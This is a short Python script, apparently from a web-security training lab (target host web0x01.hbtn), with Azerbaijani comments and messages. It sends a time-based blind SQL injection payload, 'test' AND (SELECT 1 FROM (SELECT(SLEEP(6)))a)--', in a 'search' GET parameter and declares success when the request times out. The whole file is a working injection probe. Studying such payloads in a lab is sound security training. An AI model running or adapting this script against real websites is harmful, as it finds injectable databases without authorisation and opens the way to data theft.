import requests
import time

# Hədəf URL və zəif ola biləcək GET parametri (məsələn: search)
url = "http://web0x01.hbtn/a3/sql_injection/"
payload = "test' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)--"

print("Sorğu göndərilir, zəhmət olmasa gözləyin...")
start_time = time.time()
try:
    response = requests.get(url, params={"search": payload}, timeout=10)
    elapsed = time.time() - start_time
    print(f"Cavab müddəti: {elapsed:.2f} saniyə")
except requests.exceptions.Timeout:
    print("[+] UĞURLU! Sorğu vaxtaşımına (Timeout) uğradı (6 saniyədən çox çəkdi). Time-based SQLi işləyir!")
